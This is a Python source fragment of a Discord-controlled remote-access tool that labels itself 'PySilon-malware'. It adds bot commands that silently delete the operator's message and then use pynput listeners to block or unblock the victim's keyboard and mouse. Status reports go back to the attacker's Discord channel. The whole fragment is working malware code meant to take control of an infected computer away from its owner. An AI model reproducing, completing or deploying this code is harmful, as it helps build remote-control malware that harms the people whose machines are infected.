from pynput import keyboard, mouse

keyboard_listener = keyboard.Listener(suppress=True)
mouse_listener = mouse.Listener(suppress=True)
input_blocked = False

def build_embed(title, description, colour):
    embed = discord.Embed(title=title, description=f'```{description}```', colour=colour)
    embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
    return embed

async def handle_input(block_input, message):
    global input_blocked, keyboard_listener, mouse_listener
    if block_input == input_blocked:
        title = "ğŸ”´ Hold on!"
        description = f"The input is already {'blocked' if block_input else 'unblocked'}. {'Unblock' if block_input else 'Block'} it by using .{'unblock' if block_input else 'block'}-input"
        colour = discord.Colour.red()
    else:
        if block_input:
            keyboard_listener = keyboard.Listener(suppress=True)
            mouse_listener = mouse.Listener(suppress=True)
            keyboard_listener.start()  #.log Disabled keyboard 
            mouse_listener.start()  #.log Disabled mouse 
        else:
            keyboard_listener.stop()  #.log Unblocked keyboard 
            mouse_listener.stop()  #.log Unblocked mouse 
        input_blocked = block_input
        title = "ğŸš« Input Blocked" if block_input else "ğŸŸ¢ Input Unblocked"
        description = f"Input has been {'blocked' if block_input else 'unblocked'}. {'Unblock' if block_input else 'Block'} it by using .{'unblock' if block_input else 'block'}-input"
        colour = discord.Colour.red() if block_input else discord.Colour.green()
    embed = build_embed(title, description, colour)
    await message.channel.send(embed=embed)

# on message
elif message.content in ['.block-input', '.unblock-input']:  #.log Message is "block input" or "unblock input"
    await message.delete()  #.log Removed the message 
    block_input = message.content == '.block-input'
    await handle_input(block_input, message)
